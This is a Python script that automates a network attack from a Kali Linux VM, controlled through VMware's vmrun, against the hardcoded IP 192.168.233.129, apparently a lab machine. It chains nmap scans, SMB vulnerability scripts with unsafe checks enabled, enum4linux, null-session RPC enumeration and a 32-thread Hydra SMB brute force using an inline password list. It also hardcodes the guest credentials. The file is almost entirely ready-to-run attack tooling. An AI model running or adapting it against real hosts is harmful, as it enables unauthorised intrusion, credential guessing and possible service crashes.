#!/usr/bin/env python3
"""
Kali vmrun pentest executor - runs commands in Kali VM and retrieves results
"""
import subprocess
import time
import sys
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
VMX = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'
KALI_USER = 'kali'
KALI_PASS = 'kali'
TARGET = '192.168.233.129'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

def run_in_kali(cmd, wait_sec=60):
    """Run command in Kali VM and get output"""
    # Write command to script
    script = f'#!/bin/bash\n{cmd}\n'
    host_script = os.path.join(TEMP, 'kali_cmd.sh')
    with open(host_script, 'w', encoding='utf-8', newline='\n') as f:
        f.write(script)
    
    # Copy to guest
    subprocess.run([VMRUN, '-T', 'ws', '-gu', KALI_USER, '-gp', KALI_PASS,
                    'copyFileFromHostToGuest', VMX,
                    host_script, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    
    # Run command (synchronous - vmrun waits for completion)
    run_result = subprocess.run([VMRUN, '-T', 'ws', '-gu', KALI_USER, '-gp', KALI_PASS,
                    'runProgramInGuest', VMX,
                    '-activeWindow',
                    '/bin/bash', '-c', 
                    f'chmod +x /tmp/kali_cmd.sh && timeout {wait_sec} /tmp/kali_cmd.sh > /tmp/kali_output.txt 2>&1'],
                   capture_output=True, text=True, timeout=wait_sec + 30)
    
    # Copy output back
    host_output = os.path.join(TEMP, 'kali_output.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', KALI_USER, '-gp', KALI_PASS,
                    'copyFileFromGuestToHost', VMX,
                    '/tmp/kali_output.txt', host_output],
                   capture_output=True, text=True, timeout=30)
    
    try:
        with open(host_output, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[ERROR] Cannot read output"

def run_in_kali_bg(cmd, wait_sec=60):
    """Run long command in background, poll for output"""
    script = f'#!/bin/bash\n{cmd}\necho "CMD_DONE_$(date +%s)"\n'
    host_script = os.path.join(TEMP, 'kali_cmd.sh')
    with open(host_script, 'w', encoding='utf-8', newline='\n') as f:
        f.write(script)
    
    subprocess.run([VMRUN, '-T', 'ws', '-gu', KALI_USER, '-gp', KALI_PASS,
                    'copyFileFromHostToGuest', VMX,
                    host_script, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    
    # Start in background
    subprocess.run([VMRUN, '-T', 'ws', '-gu', KALI_USER, '-gp', KALI_PASS,
                    'runProgramInGuest', VMX,
                    '-noWait',
                    '/bin/bash', '-c', 
                    f'chmod +x /tmp/kali_cmd.sh && /tmp/kali_cmd.sh > /tmp/kali_output.txt 2>&1'],
                   capture_output=True, text=True, timeout=30)
    
    # Poll for completion
    host_output = os.path.join(TEMP, 'kali_output.txt')
    for i in range(wait_sec // 5 + 1):
        time.sleep(5)
        print(f"  ...waiting ({(i+1)*5}s)", end='\r')
        subprocess.run([VMRUN, '-T', 'ws', '-gu', KALI_USER, '-gp', KALI_PASS,
                        'copyFileFromGuestToHost', VMX,
                        '/tmp/kali_output.txt', host_output],
                       capture_output=True, text=True, timeout=30)
        try:
            with open(host_output, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            if 'CMD_DONE_' in content:
                print(f"  ...done!          ")
                return content
        except:
            pass
    print(f"  ...timeout!        ")
    
    # Return whatever we have
    try:
        with open(host_output, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[TIMEOUT]"

def main():
    print("=" * 60)
    print(f"PENETRATION: Kali VM -> {TARGET}")
    print("=" * 60)

    # 1. Quick nmap scan
    print("\n[1] Nmap quick scan (top 1000 + service detection)...")
    out = run_in_kali(f"sudo nmap -sS -sV --top-ports 1000 -T4 {TARGET}", wait_sec=60)
    print(out)

    # 2. SMB vuln scan  
    print("\n[2] SMB vulnerability scan (MS17-010 etc)...")
    out = run_in_kali(f"sudo nmap -p 445 --script=smb-vuln* --script-args unsafe=1 {TARGET}", wait_sec=120)
    print(out)

    # 3. Enum4linux
    print("\n[3] SMB/NetBIOS enumeration (enum4linux)...")
    out = run_in_kali(f"enum4linux -a {TARGET} 2>&1 | head -300", wait_sec=90)
    print(out)

    # 4. SMB null session
    print("\n[4] SMB null session + RPC enum...")
    out = run_in_kali(
        f"echo '=== SMBCLIENT ===' && smbclient -L //{TARGET}/ -N 2>&1 && "
        f"echo '=== RPCCLIENT ===' && rpcclient -U '' -N {TARGET} -c 'enumdomusers;querydominfo;netshareenumall' 2>&1",
        wait_sec=30
    )
    print(out)

    # 5. Hydra brute force
    print("\n[5] SMB brute force (hydra, 32 threads)...")
    out = run_in_kali(
        "printf 'lkjm\\nadministrator\\nadmin\\nguest\\nuser\\ntest\\nsupport\\n' > /tmp/users.txt && "
        "printf '\\n123\\n1234\\n123456\\n12345678\\npassword\\nPassword1\\nadmin\\nadmin123\\n"
        "P@ssw0rd\\nqwerty\\nabc123\\nWelcome1\\nletmein\\nlkjm\\nlkjm123\\ntest\\ntest123\\n"
        "root\\nchangeme\\n000000\\n111111\\n666666\\n888888\\nWindows1\\nvmware\\n"
        "Aa123456\\n1qaz2wsx\\nq1w2e3r4\\nAdmin@123\\nP@ss1234\\nPassw0rd\\nadmin@123\\n"
        "123456789\\npassword1\\niloveyou\\ntrustno1\\nsunshine\\nmaster\\nshadow\\n' > /tmp/passes.txt && "
        f"hydra -L /tmp/users.txt -P /tmp/passes.txt -t 32 -f smb://{TARGET} 2>&1",
        wait_sec=180
    )
    print(out)

    # 6. Full port scan
    print("\n[6] Full port scan (65535 ports)...")
    out = run_in_kali(f"sudo nmap -sS -p- --min-rate 5000 -T4 {TARGET} 2>&1 | tail -30", wait_sec=300)
    print(out)

    print("\n" + "=" * 60)
    print("ALL SCANS COMPLETE")
    print("=" * 60)

if __name__ == '__main__':
    main()
